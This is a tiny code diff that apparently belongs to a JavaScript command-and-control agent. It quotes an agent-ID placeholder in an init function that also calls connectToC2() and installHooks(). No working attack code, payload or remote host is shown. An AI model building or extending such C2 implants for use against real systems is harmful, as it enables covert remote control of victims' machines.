@@ -16,7 +16,7 @@
         // Initialize the agent
         init: function() {
             console.log("Agent initializing...");
-            this.agentId = __BARK_AGENT_ID__;
+            this.agentId = "__BARK_AGENT_ID__";
             this.connectToC2();
             this.installHooks();
         },
